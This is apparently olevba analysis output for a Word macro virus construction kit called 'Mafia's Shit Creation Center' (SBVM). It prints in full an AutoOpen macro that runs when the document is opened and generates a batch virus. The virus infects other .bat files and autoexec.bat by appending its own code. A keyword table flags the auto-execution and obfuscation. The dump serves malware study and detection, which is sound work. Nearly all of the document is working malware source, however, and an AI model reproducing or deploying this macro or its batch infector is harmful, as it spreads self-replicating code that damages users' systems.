olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.SBVM.b-f0408ca24a0c610eaa651c6f1157620efb4f3d4e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.SBVM.b-f0408ca24a0c610eaa651c6f1157620efb4f3d4e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Constructor.MSWord.SBVM.b-f0408ca24a0c610eaa651c6f1157620efb4f3d4e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "Mafia's Shit Creation Center v1.0b" + Chr(13) + _
"                   " + Chr(13) + _
"       (c) by XaRaBaS [DkpRJ]", "MSCC v1.0b"
WordBasic.BeginDialog 400, 150, "MSCC v1.0b   (c) XaRaBaS [DkpRJ]"
WordBasic.Text 10, 10, 300, 20, "Enter virus info and click OK"
WordBasic.Text 10, 40, 100, 50, "NaMe oF ThiS ShiT:"
WordBasic.TextBox 120, 40, 120, 17, "Ident$"
WordBasic.Text 10, 70, 100, 50, "Author:"
WordBasic.TextBox 120, 70, 120, 17, "Author$"
WordBasic.Text 10, 100, 100, 50, "TyPe HeRe ThE PaTh AnD ThE NaME Of ThE ViRuS:"
WordBasic.TextBox 120, 100, 240, 17, "Name$"
WordBasic.OKButton 270, 40, 90, 20
WordBasic.CancelButton 270, 70, 90, 20
WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
dlg.Ident$ = "[DkpRJ]"
dlg.Author$ = "XaRaBaS 1999 [DkpRJ]"
dlg.Name$ = "c:\boot.bat"
On Error GoTo -1: On Error GoTo Clo
WordBasic.Dialog.UserDialog dlg
WordBasic.FileNew
WordBasic.Insert "@echo off %" + dlg.Ident$ + "%" + Chr(13) + Chr(10)
WordBasic.Insert "if -%1==-@ goto " + dlg.Ident$ + "z" + Chr(13) + Chr(10)
WordBasic.Insert "echo.>" + dlg.Ident$ + ".bat" + Chr(13) + Chr(10)
WordBasic.Insert "find " + Chr(34) + dlg.Ident$ + Chr(34) + _
"<%0>>" + dlg.Ident$ + ".bat" + Chr(13) + Chr(10)
WordBasic.Insert "for %%b in (*.bat) do call " + _
dlg.Ident$ + ".bat @ %%b" + Chr(13) + Chr(10)
WordBasic.Insert "del " + dlg.Ident$ + ".bat" + Chr(13) + Chr(10)
WordBasic.Insert "goto " + dlg.Ident$ + Chr(13) + Chr(10)
WordBasic.Insert ":" + dlg.Ident$ + "z [SBVM 0.02d]" + Chr(13) + Chr(10)
WordBasic.Insert "if -%2==-autoexec.bat goto " + dlg.Ident$ + _
Chr(13) + Chr(10)
WordBasic.Insert "find " + Chr(34) + dlg.Ident$ + Chr(34) + _
"<%2>nul" + Chr(13) + Chr(10)
WordBasic.Insert "if errorlevel 1 type " + dlg.Ident$ + _
".bat>>%2" + Chr(13) + Chr(10)
WordBasic.Insert ":" + dlg.Ident$ + " by " + dlg.Author$
WordBasic.FileSaveAs Name:=dlg.Name$, Format:=4
WordBasic.FileClose (2)
WordBasic.MsgBox "A NeW ViRuS WaS CreAtED!!" + Chr(13) + _
"ThAnKs FoR UsInG MaFiA's ShIt CoStRuCtIon KiT", "MSCC v1.0b"
Clo:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |boot.bat            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

